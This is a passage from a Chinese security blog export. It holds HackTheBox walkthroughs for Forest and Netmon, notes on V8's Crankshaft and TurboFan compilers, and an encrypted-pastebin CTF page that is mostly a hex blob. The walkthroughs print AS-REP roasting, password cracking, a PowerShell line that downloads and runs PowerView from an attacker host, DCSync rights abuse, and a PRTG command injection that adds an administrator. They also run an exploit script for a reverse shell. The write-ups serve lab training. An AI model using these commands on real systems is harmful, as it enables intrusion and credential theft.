rid:[0x46c]user:[HealthMailboxc3d7722] rid:[0x46e]user:[HealthMailboxfc9daad] rid:[0x46f]user:[HealthMailboxc0a90c9] rid:[0x470]user:[HealthMailbox670628e] rid:[0x471]user:[HealthMailbox968e74d] rid:[0x472]user:[HealthMailbox6ded678] rid:[0x473]user:[HealthMailbox83d6781] rid:[0x474]user:[HealthMailboxfd87238] rid:[0x475]user:[HealthMailboxb01ac64] rid:[0x476]user:[HealthMailbox7108a4e] rid:[0x477]user:[HealthMailbox0659cc1] rid:[0x478]user:[sebastien] rid:[0x479]user:[lucinda] rid:[0x47a]user:[svc-alfresco] rid:[0x47b]user:[andy] rid:[0x47e]user:[mark] rid:[0x47f]user:[santi] rid:[0x480]user:[wasim] rid:[0x1db1] users把用户名提取出来，作为字典 12345678Administratorsebastienlucindasvc-alfrescoandymarksantiwasim GetNPUsers就是使用前面得到的用户名字典，执行GetNPUsers，如果能够成功得到hash，就可以进行AS-REP Roasting： 123456for user in $(cat users.txt);do python3 ~/Tools/impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb.local/$&#123;user&#125;;done...[*] Getting TGT for svc-alfresco$krb5asrep$23$svc-alfresco@HTB.LOCAL:0d853aa9ac40a229135644f5fc9c50c4$52bf89e2f77cb3e0a78dbe00bb3051b6e52488c2b2f090d5d22b768c6f1180fe5ad3b07fdd91497579bb0e6c24933f6dab51e92ffa94b380df3725326e27ea03bacad08192bf6e15ecabe6cc79ec3d38f05cf64235c8c3d5d5c1c6bd160db3e3a9e70520e2546c8627b344208ce05d65622f9bc1afdb0784282de0c6fc2523ad8a4c18f673a00fda94c706534fca8124069f9dfca7aabb6419b29afd8227e917caf5f5414ec87740b90f0c1a4e4e20f6c1e196115696bb52a096b3e2484fe04f5d266743a96ed4173baa36d1cd1412c945573ad0d53d1f74e068cdbebc04da3aa11ea8b53ebcImpacket v0.9.22.dev1+20201105.154342.d7ed8dba - Copyright 2020 SecureAuth Corporation... john破解得到的hash，得到svc-alfresco账户密码： 1234567➜ Forest sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt[sudo] password for miao:...s3rvice ($krb5asrep$23$svc-alfresco@HTB.LOCAL)... user flag5985端口开放，可以直接使用winrm登录，桌面得到user.txt: BloodHound然后就是BloodHound搜集信息，分析到域管的攻击路径： https://github.com/BloodHoundAD/BloodHound 上传，运行，下载结果，本地导入分析： 提权Exchange Windows Permissions首先需要加入到Exchange Windows Permissions组中： 1net group &quot;Exchange Windows Permissions&quot; svc-alfresco &#x2F;add &#x2F;domain 然后Exchange Windows Permissions组有WriteDacl权限： WriteDacl滥用权限，使得我们可以执行DCSync,需要首先导入powerview： https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 会自动清理，所以整合成一行执行： 123iex(new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.14.3:9999&#x2F;PowerView.ps1&#39;)Add-DomainGroupMember -Identity &#39;Exchange Windows Permissions&#39; -Members svc-alfresco; $username &#x3D; &quot;htb\\svc-alfresco&quot;; $password &#x3D; &quot;s3rvice&quot;; $secstr &#x3D; New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object &#123;$secstr.AppendChar($_)&#125;; $cred &#x3D; new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity &#39;svc-alfresco&#39; -TargetIdentity &#39;HTB.LOCAL\\Domain Admins&#39; -Rights DCSync DCSync然后我们就可以用svc-alfresco账号执行DCSync，获取hash： root flag然后直接使用hash登录Administrator账号，桌面得到root.txt： 参考资料 https://github.com/BloodHoundAD/BloodHound https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 HTB: Forest | 0xdf hacks stuffhttps://0xdf.gitlab.io/2020/03/21/htb-forest.html https://www.hackthebox.eu/home/machines/writeup/212 HackTheBox - Forest - YouTubehttps://www.youtube.com/watch?v=H9FcE_FMZio&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Netmon - HackTheBox","slug":"Netmon-HackTheBox","date":"2020-01-18T06:29:08.000Z","updated":"2020-11-06T06:30:30.025Z","comments":true,"path":"2020/01/18/Netmon-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/01/18/Netmon-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/177 10.10.10.152 端口扫描123456789101112131415161718192021222324252627282930313233343536373839404142$ nmap -sC -sV -Pn 10.10.10.152Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-06 12:49 CSTNmap scan report for 10.10.10.152Host is up (0.067s latency).Not shown: 995 closed portsPORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 02-02-19 11:18PM 1024 .rnd| 02-25-19 09:15PM &lt;DIR&gt; inetpub| 07-16-16 08:18AM &lt;DIR&gt; PerfLogs| 02-25-19 09:56PM &lt;DIR&gt; Program Files| 02-02-19 11:28PM &lt;DIR&gt; Program Files (x86)| 02-03-19 07:08AM &lt;DIR&gt; Users|_02-25-19 10:49PM &lt;DIR&gt; Windows| ftp-syst:|_ SYST: Windows_NT80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)|_http-server-header: PRTG/18.1.37.13946| http-title: Welcome | PRTG Network Monitor (NETMON)|_Requested resource was /index.htm|_http-trane-info: Problem with XML parsing of /evox/about135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-dsService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:| smb-security-mode:| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2020-11-06T04:49:53|_ start_date: 2020-11-05T06:38:30Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.25 seconds 21 ftpFTP可以匿名访问： 8080是PRTG Network Monitor 18.1.37.13946 ： user flaguser.txt在FTP里： 1ftp:&#x2F;&#x2F;10.10.10.152&#x2F;Users&#x2F;Public&#x2F; PRTG Network Monitor在FTP里查看netmon的安装目录： 1ftp:&#x2F;&#x2F;10.10.10.152&#x2F;Program%20Files%20(x86)&#x2F;PRTG%20Network%20Monitor&#x2F; 查找相关资料，去查看配置文件： How and where does PRTG store its data? | Paessler Knowledge Basehttps://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data 1ftp:&#x2F;&#x2F;10.10.10.152&#x2F;ProgramData&#x2F;Paessler&#x2F;PRTG%20Network%20Monitor&#x2F; 这个配置文件里得到一组账号密码： 1234&lt;dbpassword&gt; &lt;!-- User: prtgadmin --&gt; PrTg@dmin2018&lt;&#x2F;dbpassword&gt; prtgadmin然后可以去80登录，直接用这个密码是错误的，因为是老的配置文件，可以根据规则把密码改成PrTg@dmin2019(失败的话reset一下机器): 然后根据版本号，搜到一个漏洞： PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution - Windows webapps Exploithttps://www.exploit-db.com/exploits/46527 很常规的命令注入 CVE-2018-9276Setup &gt; Account Settings &gt; Notifications. Add new notification,在Execute Program那里注入命令： 1abc.txt | net user miao abc123! &#x2F;add ; net localgroup administrators miao &#x2F;add 然后去点击触发： 编码问题很容易导致失败(也可能是延迟问题，我用python打完后发现meterpreter那里弹回来一堆，都是之前测试的)，找到别人写的一个python： nullarmor | Netmon - Hack The Boxhttps://nullarmor.github.io/posts/netmon https://raw.githubusercontent.com/nullarmor/hackthebox-exploits/master/netmon/netmon.py 一键打 root flag直接exp打到system shell 读取root.txt: 123python netmon.py --rhost http://10.10.10.152 --username prtgadmin --password PrTg@dmin2019 --lhost 10.10.14.7 --lport 4447type C:\\Users\\Administrator\\Desktop\\root.txt 参考资料 How and where does PRTG store its data? | Paessler Knowledge Basehttps://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution - Windows webapps Exploithttps://www.exploit-db.com/exploits/46527 nullarmor | Netmon - Hack The Boxhttps://nullarmor.github.io/posts/netmon https://raw.githubusercontent.com/nullarmor/hackthebox-exploits/master/netmon/netmon.py https://www.hackthebox.eu/home/machines/writeup/177 HackTheBox - Netmon - YouTubehttps://www.youtube.com/watch?v=ZxvgniJXbOo&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"V8的优化编译器","slug":"V8的优化编译器","date":"2020-01-16T07:19:01.000Z","updated":"2020-01-16T07:20:13.890Z","comments":true,"path":"2020/01/16/V8的优化编译器/","link":"","permalink":"https://darkwing.moe/2020/01/16/V8%E7%9A%84%E4%BC%98%E5%8C%96%E7%BC%96%E8%AF%91%E5%99%A8/","excerpt":"","text":"Crankshaft和TurboFan两者都是用于优化的编译器 关于调用优化 Hot-code，即多次调用的函数或者循环 对函数单元或者循环单元进行优化 和主线程中的机器代码运行并行执行，runtime-profiler在其他的线程中计数并判断 也取决于函数或者循环代码的size，大概1000次或者10000次被调用的话，会成为优化对象 123456function f() &#123; return 1;// hot-code(有成为hot-code的可能性)&#125;for (var i=0; i&lt;10000; i++) &#123; func(); // hot-code(有成为hot-code的可能性)&#125; 判定为Hot-code TurboFan/Crankshaft会在hot的其他线程，再次变异对应区域的代码 但是也存在即使是hot-code，也不进行优化的情况(后述) 对(主线程运行中的)机器语言的jmp目的地址进行替换，切换到执行优化后的机器代码 12345678910函数切换为优化代码时，更新函数对象持有的指向JIT区域的指针function f() &#123; return 1;// hot-code(都有成为hot-code的可能性)&#125;for (var i=0; i&lt;10000; i++) &#123; func(); // hot-code(都有成为hot-code的可能性)&#125;在循环中，当从中间切换到优化代码时，可以将jmp目的地址切换到循环的顶部但仍然存在名为OSR（On-Stack-Replacement）的切换方法。但这里省略，参考这篇文章：https://wingolog.org/archives/2011/06/20/on-stack-replacement-in-v8） 优化编译器的适用条件(主要的) 函数/循环中，未使用优化不支持的文法 debugger语句，eval语句之类的 存在”use asm”语句的话，使用TurboFan 只有TurboFan可以优化asm.js 如果有Crankshaft不支持的文法，使用TurboFan try-catch语句，with语句之类的 默认使用Crankshaft 这是2016年的情况，现在Crankshaft被移除 CrankshaftCrankshaft的特点 Type-feedback 使用runtime-profiler收集的信息，确定类型进行加速 最终生成的优化代码包含类型检查 不能确定类型时，也能够回退到优化前的代码 Hydrogen(基于High-Level的中间表现(HIR)的优化) AST以SSA格式展现 各种优化，例如将循环内不变的变量移到循环外 Lithium(基于Low-Level的中间表现(LIR)的优化) 用于寄存器分配的快速算法 依赖CPU的优化，代码生成 细节参考：http://nothingcosmos.github.io/V8Crankshaft/src/blog.html TurboFanTurboFan的概览参考资料： https://github.com/v8/v8/wiki/TurboFan https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.p 下图是2018年现在TurboFan的整体情况 TurboFan的特点 Graph Building 根据AST，生成JavaScript节点的graph JSAdd，JSCallFunction，JSLoadProperty，IfTrue，IfFalse之类的 边生成graph边优化 Optimization 对graph各种优化 Code Generation 机器代码生成 TurboFan的优化参考src/compiler/pipeline.cc inline 函数调用的inline化 trimming 删除没有到达的节点 typer 收集类型信息进行优化 typed-lowering 根据类型将表达式和指令进行变换 loop-peeling 循环内处理转到循环外 simplified-lowering 用更具体的值来进行指令的简单转换 branch-elimination 删除不必要的分支 generic-lowering 将JS前缀指令转换为更简单的调用和stub调用 等等等等 出于某种原因，在名为GenerateCode()的函数中执行了对类型和graph的各种优化。此外，尽管从CreateGraph()调用GenerateCode()，但这些函数原本应该是独立的。(在代码中还有三个独立的部分，job-&gt; CreateGraph()，job-&gt; OptimizeGraph()，job-&gt; GenerateCode()）实际上，在V8的这个时间段中，每个phase都没有完全分离，因为优化和代码生成都是在CreateGraph()函数内部实现的。 优化编译器的确认方法可以使用–trace-opt来检查Crankshaft/TurboFan 还可以使用–turbo-stats检查TurboFan的优化列表和统计数据： 可以使用d8 –print_code之类的检查编译结果：","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[]},{"title":"Encrypted Pastebin Writeup(Hacker101 CTF)","slug":"Encrypted-Pastebin-Writeup-Hacker101-CTF","date":"2020-01-15T04:05:01.000Z","updated":"2020-01-15T04:06:46.501Z","comments":true,"path":"2020/01/15/Encrypted-Pastebin-Writeup-Hacker101-CTF/","link":"","permalink":"https://darkwing.moe/2020/01/15/Encrypted-Pastebin-Writeup-Hacker101-CTF/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. 0d0a0db90f48598f28571ee85a29195b5a312b18d9d7fc356b44eba628e6029503d95701a6b605e39c3ebe32e4d6100c78bf653eccdbd0fd146c3e965160252680757e628ccad9de3a342e48323874bbef3d565badd4dfdc9b2ce4b46a757929ad235748dcdbac7a1b26e419542caee132c47d6943e1aab11a919c2b0099dcc72d783fde1a794b4026cadcf4ec5d868fae6af4cab0321d512c1b41f5e114f248947f29ab651a22acd3c688457dec53cbcf89bd0cd1c0ac3556e86438f9826696cb2117eff4c1e6617732ca881df03c0346525c179f90ef86890ebd81ea96d20b9c79f46b8e575291ad32f3557ced411bd9d325d75dc53700172ddbce87f24627bac98d22c88b40b270d1dc0c9100e97cbf7ca01463eda2d634d0b53fa57f4248cebb7e2859e15e7d76c7634b433210017ccb79e969b053216f2ab99af44d131220560fa1ce6105d3004feb9781fbd5a3cc876fa69e3025c2581ea8c5c1a3840524e0e83de7a7d113988812eb7e021de99b8922b1de84dd9f9c28989063cac4f2d040eb76deee1ab4d3b39f95dbec80eca2dbe2d4e35a3b39cab6f9978fa74c7ae5e6dcfb70cda2e0bd5a490308488cd992d7a20c3b9bb63665d9e5c8ba1c83c939ac9565a6be4d97e359aa04e2b241640e8a99ff9a26e2e9b2544293908b9f17eb3f6b27390fef742fe370b63b60a047951fe07c9022fcb2e1311b482fb3dd745756fb2f88f0832a56c491e09a40dcc43c7fe61ee0a1ee91711b303a3b4bdc8e7c9231faa16478531bf3e1e17b71c11a2d571226bf610aa77e298b0f131d2f7eeae6059eee1e637ed0a80a789093fd38dcfc1c6260c946e8f1c869231a581d4b50099d8672223fabb1edb04c7b3e8d051da274ebc48fc275abc44d31a55a2f0979127ee02112b8cfab536be1499c541bdbb8462ec72a4b7522cc2d193f23afa17b9a2ac9c421fca7c2e8d6e09a1692f4fd9b4b3fc19689eeff9067a0d43b32d1ea6b56f0ccf383a234d1446973d4dfb398c0ae352b94a4a06a6dfb93be87f4478d83670270a898c614d946d20e33cbf6ed7a645ff5646d22008317a24bcd323c95cf7edc39b653594695666d28638798b5786d8e29f111c3afaa7eaccbf9956fb3e81bdcc6823c4242ac09658f262a6409c21f41060eff5e30045b8365f3ac161c8c37381bcf1fc68c707fea57adb6df7fe03c6598ef5766448f16edbfdf2859695b5bc869421c06b4d866023b6e994a2c8c313cc16b562e11c24bbe870e102f81dd187e1909b5e8747dcb01f04a0c49be29a03d4b068d6eee60568717210369ff3afe3ac5292f776b3e10e904a9e677edb3d713dc19b104b652a2593d3fe34048e6639dcb4d16870f00680f565ecaf115ff0fd958222827adc0334d45c04aac005367067b2665eb80a7236233959526c7e7ede37ea67041de64a0c4adb214e26583eb9652ffea9ed6ec1124c8f617205caf8991e68c16980c50f1035200b9b6be4dfcf80922f869cbc66c06265d91034582a94c21dbfcc9924bac0cda3bc0827b2b645ee257e7b0312c7e711929a836463852d401d9c5c287079cb1cb505c1d557cd409ee26ec337ac459773074442da688d446ba44d3d44b0a5a803afde9d26fd7ea31311f9532bc38cff763e8f78353cf8b97193494286de80e642bdee86d9f807144aeef2506fdba6b24754de333bc91987da573c68129378931ee09fe9270776b8a1aa5f8187f94c5f3b7193d4b620cbd10baa98a159c999f55254561c0ff2dbbac7f5920d3c7d7cedc33bac25b72ea23609c8bd93cf16b7d07453aec6dfe7270adfa7b5459bf092dba53c2e10e596a5c42f8c6872147c9ff0d5795274ee6547adefb60750b3b3e5f047b0e8b594122b306db3be3222680bd85d48c0365fd8615a757f5b2f5a6c01b880a12686abe47ff3c2ace573edda03ef1d37a956a4d561f33ee6f0bac69fde4eedb386ee69d703ab256d6bc68811fa6293f28fd02e802299efb84df885e65a33ff2c4390d9f6947093464d72be68f985eef54da8f350e96c31de96bbca7379a436619cf2eb7d53020e242531d7aa12efa2168afae136113f6de38f3cf6d92f40185a758ce134434811c807142fa822fc2c51eca35832de61592ccdbddc9e79ff13536993f1c3a30208f3a95bf1aa95a88fb1513d769c24832e4e3ad7a3ae22432278de36173e25f727111e2510625f311a4224755cc1df5526c3346ffe7928a076bc71a2cd64d1bc1eb27d862ccd534e5dfd6e14757354c01e59384bd522c00dd2b42b54bfc73746032552ff77bf826a3179574250108201f70744d04290fa5f872e8d04c85b87b5c970788d75c179f37e51a83190e4ddd8293dda4845be110cd439148dbd410330f4e78fc5788bcf06f0c4cd81f26976216df65df67a09176cec3b7ba05cbc8ccc7b687fc5685a1b0b7c7bcbd7468f329bc8f86774995e80fc1ada79ef37069f1aa3fb30e6fa324e1ba621cc1e4746d4f5352a500cca946e63ae16862b05889be557029c76e0b98918405bd4534435fea7c05cd087a6c62872aedd8465e7f9756b48cba68d17f532074f504d81aca3a6d1f49c2e24983a8969a5e8dae7668680cf82a7c0545e91dfcc427cfd9aab5cb6d2be096c7f8f552a9256a3997d6a33dad0282ae776818f29bf789bd56ea9640ceb2af7b0a0bd392441995301ef29d0940bd527f9a0ed829f5ac1e90cae51ff5427309db80d845b93728a3a6b89dbe6b8d809cbc759aef9dac64a69ffe8cedb6be59dac114aee6c60ea92ac75d705fecb65d2b1246c653b6459bb4aab97c690e4043940d3e5dff8c5ce0ceb0aaf835261edebdd37808172fadae9ba6a3dc4e6af167d57b96ed1fad726a46df8a5370aef51800512c10b523621ccf797ca763de087b9b72b1aad8a5ddf729d5cb7a1614dd8d34e616da8e7a909d44a76d81157b6e416ad09bdffc474659835aa4a23e293d5d6f363a72ca48a3fd9a20376ad553d80de2ff2870ad022d4cb167a686fcec025e40c9e265b5bfcbb11e480bd8fc89e3dfc8a98c4a3e6dccfc7d44013ac51cdb922df199b52d83045fcac811d1d0393099ff1f1895e375d7575b4812c84771cc74adc01e172cf25a0588f2a13e5f218b89b419d35780c47f4275ff6bc4d6d3445617275bfc9137fdff2ad1a92fc9cb196cdacaf35bdbaaf3178e7065a88fa79992bd15c3e8c8de994ceb362b6a76773d60bce1dcbc12ef483a1eeda3e4a2fe80ea82f57d7a89fadbf75d95cff36b69dcc16bc2298d627b257b8922b46b001d23bae75641143d7f7daf123f007f91ac7fd1db257c739513b8bdf7b846f98d483d7c88f1e34dd667a7d91e24b7921894bdd0ceaf335e02860b45b8f43dcbc114aafa954f59f2c967c9fde5a024b8492fdef74b2c7e4fee543499cd8338551e13088166ae35c34f398f6f5a9690350982ccab15b39ecf0215c63061e95b1b36ef7640d147e96a7049411169885466667d73fb6b545f7eb7dae878f9113587e8ecf03833779219f004f380d99e25a3cf1c651df446cdc1fba55b673b6b4ed6be5439f8fac4b64f5ecd56493fa5693edb9636671f51ffa98105edacbb2acc3aa334c96aef0914f3c9cbf68d23f9f27bd97a9a1d244d2d2b8a016b1991be9bb012876c1dac80d077123db041f4bda298a36369788967daf242ff10b2d83dd95bd857a85197925eae98e72da19c4783168e1b88e1a5f1997f94c83760f402cbbc102e7496fa7bee991423f49a0dccafceb1eb73ef02be44f7ac45f8a27cdb77b7c8214becc16ab4db4277d5d5dcb5a945055161e0149e89bee7b0fd7fafd59036dce2e6527af4dee68c4018623d5ca398dec8967850b9961c474d391b467b7d8f5be4130c8e6047163466797a12d5e3fb97c64d50fe78fbaa76cbeec86a9fc700e43b1808f7d8187447b288f990aef1375a96012b03ef1584da00379094d5a658f76a68ab9db1167f92e1ffb192acd51395f59a81cada6e025e3b287f26e4987ca4b9a4df7c413c28657fb857f79611d8eae6741d88c65a7560e688b0f453f8bdecd624430c0efe4d121b65dbab4d09de50a47fb02d074626fab7c3558cfdca4afed09c66929eac321015eeb9f4b5ddbf5149d1d721c56b0cf659e8a0f9402ff2d7858275a7d4f6a9d58fd2fafe14f0433b3ab97fd47d4cbbfa6165cc990d0ce13f3aeea274440e1e0e6470cf76f975ec305cbacc90c8ab7a6b5763af6d4cebf1d2f016d9bd112322a611bfe8dbf3aef34c8540b30506253b5599588010e706bcaba9daeb29b499213742ccbc0bd1b0bd7981a7756839fa7b072e164e463fe21f8c8546c68e7d1b3c88baec7db4e9bac300b0be95bf8d55e2facbad3df89ac28f9503a6465426ee2e6d1bf74243cf12217803700e8d0347b5ab35df13230dde15e21701d352d0aa690c0963b6d3c83f08ae0a24c498b7df321f0bdef98c5cdbc90c24a2c3ad43fff08c6e55891b3b1ebeb6c0df87d37f8ad0bf9aec4d4475cd8c789ca7f322240328c4c7113b7f783e9b4c1907dbe8b5009d030a81e7a4c647246a172a06aafdfb973058fc60c6c46edee0619b849afd35c61a722c52b6c249d92f63e44b08d52f4235b338f493af89bf4c2eef701686c890edbe201303447ee710076b67aa6972b062bad0b9688b580e31b5b81fecc15855562b34fabea09064cfd4423854eacaba6216c8b5382c989079b26087be40127f2b9554816c0ffc60ca7c0bffc4a84df56b70d900f248d7b27a3066683b94a633818ed3e039b31c99c4d097176aa9425daa67ed4d3ea858f2dfa2027e66767e3c407c8ced1a97a53f406e53804c7f29ecae75e3acca30789411f8c71f42e7ec14149789b86dcd19322196d42ef32a9a1e91f0beac8bad52ce713f863ae4bbf7f7361b11f4f9ddbb6dd855773701b9f02de3c63204ba2c276c7ea529dc1bed9f801b5fa2f23f8a5a36063554309d2955817c9bf4cf498232c5d6197d07fcc2ae3064016fa57088b17f4ac0234ec88c761d99137913ccef872a5c67469b45005d6a3c36ef1efce21a5f809f790f79b985c714be7bec69f3ad74c75fb93b30c530c6bb1a015b94be4698c76de5db143679dca34459d8ee1a6ec444c8ca1783e2f5908aa041e038d4aefec180f823d31d3623356ef08b2df566bc348392268b14af4853510e68ef89a02ad7fb787411240da41e1dddbc1e375a8a8bfd0c58a55d99ed52e02ae13d5c80151e4df4b7df7b7a7260c2b15d8a31ff016b1d40107f9cc4f0835250de278413862a1e056046c295f3c4bd9d822432bda64bb6b259fcf5a40ff9a999af7b25bc30f68cef32328ddaec1f99c49b1ac928fad6d29ec7822144370232cc199444eabb25572cd60f6293153734a969946be2da67dd95619e29adbbdd5f6e776653bdcb770b060b4ceeaeaeaef454ef2a18319cb8502f75ad8591c8c2726b28cfe5193583ab70212140f01fb6ed37357f431e6b3dade6e88ae8c0405f02229591b35c1b9b17eb9cbd13b5d1d3fa12edf3e5ce889fe97a0bbba3c158baabc7d32d6068bca4e4f497b5485c6a646343e356bb210fb17b18af6af89fe304aeede31fd77632cec8218d09e72f3b38a97e8ef06e8c8849ebb3660ee52f91dc8fae30ca58e7c4170cdf771a7378c192e345365c321d0fd7d14a3e6a764fde5fdc125119effdb146d19bfbda796f614f7da4e4be5f580144bf4e69c1265204b79825a6b4dd8018a03d81ad44803ada63ce8f516f06d0dfd3c9aa4b447b412127c24d786dfa6eccfe66cd9759dedcb3defafdfb4b9325b3e904daa9ef0b3ba22d8417ecc83aa6c0d1a841ab7e74248db87c6bbe9eb9f58a3d3146bec148a9204021db75ba057f8cd18cc089161ccb3d77619f4ab04780479526ab74cf698a77d08b8da74a593251e79bdb658237370f6c4ca4161390f023cc7511957787567bc0c8d953bced63eae5e0d1400d5f1b5375e31ca9ea9af06ae843231c8c0554b8639f4c1adb7ec89a8e59b52a124671e99405cfdc3ea0cdee9f0508ace47ff3235ff832373003cd2e58c62fd982c219a06d3430380e24980644dd540fbfb9fea5a9e78a1b52f876b172a86fba12278d9fecd930f05f522ac9da6fb641e028341d650dcb9f2006f1db7935b41194e80c97b6eaafc15b55abacf82beb9b088cbeac915413d7c302ac0c07c06d29540d3efa2ac9fecc288a7ab7e6e52242fb5e75914a9418d18604904b1c0529797438aa85e57b7b956bc01792fa04dc4b4cb9b106812303b229b40fbb76e089f8c3eae4e8c89b9d3ad8d5838f692d3894dbbb145361ff1b182ab8530cf9f0bea95812b384e8b8b77b5d7aa211174e3e8d7225c8de058218e987e8d0dba93567d7ac25169e4c5fc353cf1a66949b384a56f40cd41bdf5d475e8100b41534e2921ccb71bf51e064be2f70b150d2d17ddc3ac0ed4a19824c4be52f657720f334c1ce3bbeb7b4b4c8b2ed4dfba32c8a81a6e1c0e168875ef879d988beb884dd0a335a54327a892c817d0c20612e53ab802f677f0315e432a53386d35878a9709ceb8e8d6855cfaf5f69d70169ea53bd12e5f61a9ce4cfa43bcdd1777343e9358704c5c1bccff68389f1ec69040bb8984da38cd6318747ab3f5a572b572c876d1db68279344be8b3d3e6e84d791a5f7289ecc5279c5a219050554b6f620b3a89648f3860546e0dba5150d87f3fd80a3c0844bac1eeaedc815f1edb90434a7a6db7c5e668c475eedcf98bce91f7fa2ff5f00e86938ac33c94ddebd5f849fd39a9b8b6b9bfca8193776d52c49c753ef27251ba658346971caa52f75b58a47268706d56df75686968682a50e61f185d2c656a2d97796418ef99e7a7d7def541690aeacfaaf653a2d8a4410b3acb93db1514cf197f02da129cf71e448bafc3d4a3a912722f1521f2f3e5c4ce2a5ab12c88902fc8ada98334742967225ac541fc945f1575faff7d8bb806aeaa6230d65bd1c312662dafe7582d7c590127dc3abb7bacc2fb6554c02c555c9a8ccc38c5ba300a98d39402104b6ce20c80581e77f9788c344e4ab77767b1ff8e749ce7cac019a54edf6856f0e803d2963b35eab7bff26e41bb2ec929b4078175f3aa2cc208de5f8371f28f58ae8e28d933b7b831961a7868061c412756a6a5060676bbfaed68cc8df1be05bdb34859e848bcf314790099b5d8967e5bdd58c636e5f38a61e2d5a6ea2cef0cf446465ff1242651d89276479d01009ab10a59776b4b3ab8e7cb48dd78a6e0c9dfeb6dd1dd221ad0d5685bf49ac8f8d7241c8888ae1df875f586e44e8429c35db43500ce4df614e5f6fe45f28ecd478b136849b9a6652d9bc55ab8cf2f27f0c7a577b78c5628fae4bbc4a19d52f8eb0bb739bda9bf5da1ab9f99bcdef45f1703a17501c5e59879c08f63058e19dafd4bec4ecb5c668a1d52952c05d1fe443287d16b3a17b6486625a9856e6053db767170d343efd63374c09bede19b8096e8f7cd6b99f43a9022ee99eac82afa7fec3ab1d6d76843ae4cd77cb3219d5a382bea0fd615b3c646a5a723643aa2168347a6d0e5e785708134e6578df74e586625a6137c18f0a8da372d98b7716f17551bd9054197dc5382a0d4a527a4ec6e182d8e4ed8a41d3fd250abbd838410aa432abe1ca7b603c4703f416441a3a8c851265a69bbf2e4d7a9ba104654b5de54397d664ca2b0d9e79b29be482cfea1f690a210d0e210b0888722f105a032edf4429fd072dc4092fd525e388f997eb6d99fe9b30b70ae2c6cee2d4684e2740cd423d2310eb795e963f36ce8ea487b5e104dc3604f2a7b04deb41deb2af787a1c87dc5e0dcfce92481976e931f99e0c1f09289060bbc073af9898142c96c2fb78f8a4cec9a29a5c3a977ebf127192da3af91460ece05d4122e39195dcf237db3a3cadd0d9735b0c3dd57ae1faf3fbc6df7dadc8bdcf838fa7d577deaf9b5dcf4db825fcb96c0421f5df1b90bc9ffc8b2bcbed22506e189babbb3b4b8dd5d8adf77b2eac3654e4637bc8958a512f22c9206d6447ef0aa4ce3d28808386d895666871e5ac59066fc07e06926857298c344a414f64a5038e7718348a12e5af4866b2028c6b41aa4b6f3c6b31e9d073fff1dd875b1f3244864946fd6212e32188bfe954c93375b83336c8987b9b097360aa75d37f689239424e89915abf1ebd549d05b19abe9a571b6d741f145baa9162dc54ad62518ee859f09523a6dcd1636d69b79d801808318d9e840a584e66bc4a735ac7b5d876532bd1bd1457cc7d9362ba362f4d73208a1c5e636ac3a223096dfb82a53dedd793fa8e837dcacfad49a7fc3bc9cf95b01b1f5eb2044236f57ba87e3a72ae3e885d6174fa8cf2244c44ff3975c0381fadc0c26a969ab808b1786b529a403efe1a83dfe0c1067a342b8d5eb8ecdcff6105618ec824bb662036032a9859378f3ac0b3823a286214df0a616f6e2262439d3f833737d530f1346469893393a2cce5943d21b53d0bd419dbd50d1ef67d25324e4bfaaf43ae79bec04ce66932109d7b13d9412b7fc518ccfb981b8f63133791e75c14e1050739fd0852f483fef0967aa29c263eff420023cc84696c23695bf5958f13c8b1c7bad20f7074c7450bed42848fedb788715a3a0a812ee5a5a394bba2cff7b6105932b474cce2a6e798d46f082b2474699cd5114e7a4f5fb2d742b387143d8604c2c17dd1a05752b79c4efe6986c4c45d62d1a0c83601f16fc87b414b47db5ae2f5f12d615e79d825780bbca8fa71aa1963151ad78e2109857c171856fabd6d6020bde53ef01ba6ad4e92370abd9345949c3bee1d213a6952d1cfebe0875261053e6b86591e186b23e055556a06fee0ac0095febb2681ff3b21b5383a3dc401cbe889a0d493d42f4f73014bc2e6523c781d27cb1a28e520603a4f7cdd6c3b2d7374702e035c235fbb2dcf10e761f0c45befaa8fd382136d3283e1853d0bdd21615c7b5f326b6a55fe0e0d9227c75372fb3219e6f6be11741da100c46a53c7a29f76505ee31d9188a254155c83b2ec7bc2c41fcb58e2957064f838b0